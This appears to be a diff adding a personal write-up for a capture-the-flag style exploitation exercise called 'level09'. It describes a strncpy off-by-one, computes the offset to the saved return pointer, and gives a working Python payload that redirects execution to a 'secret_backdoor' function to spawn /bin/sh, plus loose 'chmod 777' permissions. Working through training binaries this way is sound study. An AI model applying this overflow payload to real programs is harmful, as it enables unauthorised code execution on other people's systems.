@@ -1,0 +1,25 @@
+https://devblogs.microsoft.com/oldnewthing/20050107-00/?p=36773
+-> strncpy doesn't check null termination
+
+https://studylib.net/doc/5719952/stack-overflow
+-> we can change the length of the buffer to 256 in order to reach the saved rip
+and then modify the saved rip of the first frame
+(rip is the equivalent of eip but for 64 bits)
+
+secret_backdoor function that fgets input and system calls it
+
+the length of first strncpy if 0x28 = 40
+
+python -c 'print("a" * 40 + "\xff" + pattern)' | ./levle09
+-> offset to change the saved rip is 200
+
+get secret_backdoor address with 'info function secret_backdoor' or even 'x secret_backdoor'
+-> 0x000055555555488c
+
+let's create the payload
+
+chmod 777 . && touch payload && chmod 777 payload
+python -c 'print("a"*40 + "\xff" + "\n" + "a"*200 + "\x00\x00\x55\x55\x55\x55\x48\x8c"[::-1] + "/bin/sh")' > payload
+cat payload - | ./level09
+
+fun project!
